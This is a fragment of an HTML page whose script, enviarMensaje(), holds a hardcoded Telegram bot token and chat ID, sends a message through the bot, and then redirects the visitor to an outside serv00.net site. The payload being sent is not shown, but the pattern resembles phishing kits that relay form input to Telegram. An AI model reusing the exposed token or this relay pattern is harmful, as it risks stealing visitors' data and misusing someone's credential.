...
<body>
    ...
    <script>
        ...
        async function enviarMensaje() {
            const telegramBotToken = '6528024522:AAFwZpmtyDvgy77K2hCacH9s3YTSWAnMIQs';  // Reemplaza con tu token de bot
            const chatId = '-1002007800603';          // Reemplaza con tu chat ID
            ...
            try {
                ...
                if (data.ok) {
                    ...
                    window.location.href = 'https://frangarcia.serv00.net/';
                } else {
